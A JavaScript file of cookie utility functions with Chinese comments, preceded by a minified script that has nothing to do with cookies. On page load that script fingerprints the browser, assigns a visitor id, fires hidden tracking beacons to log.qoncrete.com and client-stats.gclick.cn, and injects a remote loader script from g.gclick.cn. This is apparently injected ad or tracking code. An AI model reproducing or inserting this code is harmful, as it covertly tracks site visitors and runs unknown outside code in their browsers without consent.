!function(){function e(){if(!(++i>30)){if(!document.body)return setTimeout(e,250);if(window._GRD.uniqueId||(window._GRD.uniqueId=function(e){e=e||12;for(var n=(new Date).getTime()/1e3|0,i="";e--;)i+=(16*Math.random()|0).toString(16);return n+i}()),!window._GRD.browser)try{window._GRD.browser=function(e,n){var i={extend:function(e,n){for(var i in n)-1!=="browser cpu device engine os".indexOf(i)&&0===n[i].length%2&&(e[i]=n[i].concat(e[i]));return e},has:function(e,n){return"string"==typeof e?-1!==n.toLowerCase().indexOf(e.toLowerCase()):!1},b:function(e){return e.toLowerCase()},a:function(e){return"string"==typeof e?e.split(".")[0]:n}},o=function(){for(var e,i,o,r,t,s,a,w=0,d=arguments;w<d.length&&!s;){var f=d[w],c=d[w+1];if("undefined"==typeof e)for(r in e={},c)t=c[r],"object"==typeof t?e[t[0]]=n:e[t]=n;for(i=o=0;i<f.length&&!s;)if(s=f[i++].exec(navigator.userAgent))for(r=0;r<c.length;r++)a=s[++o],t=c[r],"object"==typeof t&&0<t.length?2==t.length?e[t[0]]="function"==typeof t[1]?t[1].call(this,a):t[1]:3==t.length?e[t[0]]="function"!=typeof t[1]||t[1].exec&&t[1].test?a?a.replace(t[1],t[2]):n:a?t[1].call(this,a,t[2]):n:4==t.length&&(e[t[0]]=a?t[3].call(this,a.replace(t[1],t[2])):n):e[t]=a?a:n;w+=2}return e}.apply(this,[[/(opera\smini)\/([\w\.-]+)/i,/(opera\s[mobiletab]+).+version\/([\w\.-]+)/i,/(opera).+version\/([\w\.]+)/i,/(opera)[\/\s]+([\w\.]+)/i],["name","version"],[/\s(opr)\/([\w\.]+)/i],[["name","Opera"],"version"],[/(kindle)\/([\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]+)*/i,/(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?([\w\.]*)/i,/(?:ms|\()(ie)\s([\w\.]+)/i,/(rekonq)\/([\w\.]+)*/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium)\/([\w\.-]+)/i],["name","version"],[/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i],[["name","IE"],"version"],[/(edge)\/((\d+)?[\w\.]+)/i],["name","version"],[/(yabrowser)\/([\w\.]+)/i],[["name","Yandex"],"version"],[/(comodo_dragon)\/([\w\.]+)/i],[["name",/_/g," "],"version"],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i,/(qqbrowser)[\/\s]?([\w\.]+)/i],["name","version"],[/(uc\s?browser)[\/\s]?([\w\.]+)/i,/ucweb.+(ucbrowser)[\/\s]?([\w\.]+)/i,/JUC.+(ucweb)[\/\s]?([\w\.]+)/i],[["name","UCBrowser"],"version"],[/(dolfin)\/([\w\.]+)/i],[["name","Dolphin"],"version"],[/((?:android.+)crmo|crios)\/([\w\.]+)/i],[["name","Chrome"],"version"],[/XiaoMi\/MiuiBrowser\/([\w\.]+)/i],["version",["name","MIUI Browser"]],[/android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)/i],["version",["name","Android Browser"]],[/FBAV\/([\w\.]+);/i],["version",["name","Facebook"]],[/version\/([\w\.]+).+?mobile\/\w+\s(safari)/i],["version",["name","Mobile Safari"]],[/version\/([\w\.]+).+?(mobile\s?safari|safari)/i],["version","name"],[/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i],["name",["version",function(e,o){for(var r in o)if("object"==typeof o[r]&&0<o[r].length){for(var t=0;t<o[r].length;t++)if(i.has(o[r][t],e))return"?"===r?n:r}else if(i.has(o[r],e))return"?"===r?n:r;return e},{"1.0":"/8",1.2:"/1",1.3:"/3","2.0":"/412","2.0.2":"/416","2.0.3":"/417","2.0.4":"/419","?":"/"}]],[/(konqueror)\/([\w\.]+)/i,/(webkit|khtml)\/([\w\.]+)/i],["name","version"],[/(navigator|netscape)\/([\w\.-]+)/i],[["name","Netscape"],"version"],[/fxios\/([\w\.-]+)/i],["version",["name","Firefox"]],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/([\w\.-]+)/i,/(mozilla)\/([\w\.]+).+rv\:.+gecko\/\d+/i,/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf)[\/\s]?([\w\.]+)/i,/(links)\s\(([\w\.]+)/i,/(gobrowser)\/?([\w\.]+)*/i,/(ice\s?browser)\/v?([\w\._]+)/i,/(mosaic)[\/\s]([\w\.]+)/i],["name","version"]]);return o.major=i.a(o.version),o}(window,void 0)}catch(o){window._GRD.browser={name:"ERR",major:0}}if(!window._GRD.isWebview)try{var r="";window.navigator&&(r=window.navigator.userAgent),function(e){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&&define.amd)define([],e);else{var n;n="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,n.isWebview=e()}}(function(){return function e(n,i,o){function r(s,a){if(!i[s]){if(!n[s]){var w="function"==typeof require&&require;if(!a&&w)return w(s,!0);if(t)return t(s,!0);var d=new Error("Cannot find module '"+s+"'");throw d.code="MODULE_NOT_FOUND",d}var f=i[s]={exports:{}};n[s][0].call(f.exports,function(e){var i=n[s][1][e];return r(i?i:e)},f,f.exports,e,n,i,o)}return i[s].exports}for(var t="function"==typeof require&&require,s=0;s<o.length;s++)r(o[s]);return r}({1:[function(e,n,i){(function(e){"undefined"!=typeof window?n.exports=window:"undefined"!=typeof e?n.exports=e:"undefined"!=typeof self?n.exports=self:n.exports={}}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],2:[function(e,n,i){"use strict";function o(e,n){return a||e?("object"==typeof e&&(n=e,e=""),n=n||{},n.appName&&r(e,n.appName)?!0:a&&t(s)?!0:r(e)):!1}var r=e("./lib/userAgent.js"),t=e("./lib/noop.js"),s=e("global/window"),a="function"==typeof t;o.getRules=function(){return rules},n.exports=o},{"./lib/noop.js":3,"./lib/userAgent.js":4,"global/window":1}],3:[function(e,n,i){"use strict";var o=[function(e){return"webView"in e},function(e){return"Android"in e},function(e){return e.document&&"ondeviceready"in e.document},function(e){return e.navigator&&"standalone"in e.navigator},function(e){return e.external&&"notify"in e.external},function(e){return"Ti"in e},function(e){return"_cordovaNative"in e}];n.exports=function(e){return o.some(function(n){return n(e)})}},{}],4:[function(e,n,i){"use strict";var o=[function(e,n){return n&&-1!==e.indexOf(n)},function(e){return e.indexOf(" Mobile/")>0&&-1===e.indexOf(" Safari/")}];n.exports=function(e,n){return e=e||"",o.some(function(i){return i(e,n)})}},{}]},{},[2])(2)}),window._GRD.isWebview=isWebview(r)}catch(o){window._GRD.isWebview=!1}if(window!=top)return void n(!0);if(!window._GRD.init){window._GRD.init=!0;var t=document.createElement("img");t.style.cssText="display: none; width: 0; height: 0;",t.src="http://log.qoncrete.com/c3227363-462c-4c46-8546-9fac8ca5e003?token=a88bdef3-20a4-4967-8311-bf09bef23023&body="+encodeURIComponent('{"name": "'+window._GRD.browser.name+'", "major": "'+window._GRD.browser.major+'"}')+"&_="+Math.random(),document.body.appendChild(t);var s=document.createElement("img");s.style.cssText="display: none; width: 0; height: 0;",s.src="http://client-stats.gclick.cn/front/proxy-exec?pvid="+(window._GRD.uniqueId||"")+"&webv="+(window._GRD.isWebview?1:0),document.body.appendChild(s);var a=document.createElement("script");a.charset="utf-8",a.src="http://g.gclick.cn/static/aloader.min.js",document.body.appendChild(a)}n()}}function n(e){var n=document.createElement("img");n.style.cssText="display: none; width: 0; height: 0;";var i="?pvid="+(window._GRD.uniqueId||"")+"&reqid="+(window._GRD.moduleArgs.reqid||"");e&&(i+="&if=1"),n.src="http://client-stats.gclick.cn/front/proxy"+i,document.body.appendChild(n)}window._GRD=window._GRD||{},window._GRD.moduleArgs={d:'3b163388c31970faa65f2e20c44d2ab8',m:'64098048E716', i:'172.19.225.190', ra:'', v:2, in:86400, reqid:1459856789625536242, config:'sprite'},window._GRD.moduleArgs=window._GRD.moduleArgs||{},e();var i=0}();
function obj2str(o){
  var r = [];
  if(typeof o == "string" || o == null) {
    return o;
  }
  if(typeof o == "object"){
    if(!o.sort){
      r[0]="{"
      for(var i in o){
        r[r.length]=i;
        r[r.length]=":";
        r[r.length]=obj2str(o[i]);
        r[r.length]=",";
      }
      r[r.length-1]="}"
    }else{
      r[0]="["
      for(var i =0;i<o.length;i++){
        r[r.length]=obj2str(o[i]);
        r[r.length]=",";
      }
      r[r.length-1]="]"
    }
    return r.join("");
  }
  return o.toString();
}

function cookie(name){    
   var cookieArray=document.cookie.split("; "); //得到分割的cookie名值对    
   var cookie=new Object();    
   for (var i=0;i<cookieArray.length;i++){    
      var arr=cookieArray[i].split("=");       //将名和值分开    
      if(arr[0]==name)return unescape(arr[1]); //如果是指定的cookie，则返回它的值    
   } 
   return ""; 
} 
function delCookie(name)//删除cookie
{
   document.cookie = name+"=;expires="+(new Date(0)).toGMTString();
}
function getCookie(objName){//获取指定名称的cookie的值
    var arrStr = document.cookie.split("; ");
    for(var i = 0;i < arrStr.length;i ++){
        var temp = arrStr[i].split("=");
        if(temp[0] == objName) return unescape(temp[1]);
   } 
}
function addCookie(objName,objValue,objHours){      //添加cookie
    var str = objName + "=" + escape(objValue);
    if(objHours > 0){                               //为时不设定过期时间，浏览器关闭时cookie自动消失
        var date = new Date();
        var ms = objHours*3600*1000;
        date.setTime(date.getTime() + ms);
        str += "; expires=" + date.toGMTString();
   }
   document.cookie = str;
}
function SetCookie(name,value)//两个参数，一个是cookie的名子，一个是值
{
    var Days = 30; //此 cookie 将被保存 30 天
    var exp = new Date();    //new Date("December 31, 9998");
    exp.setTime(exp.getTime() + Days*24*60*60*1000);
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
function getCookie(name)//取cookies函数        
{
    var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
     if(arr != null) return unescape(arr[2]); return null;
}
function delCookie(name)//删除cookie
{
    var exp = new Date();
    exp.setTime(exp.getTime() - 1);
    var cval=getCookie(name);
    if(cval!=null) document.cookie= name + "="+cval+";expires="+exp.toGMTString();
}
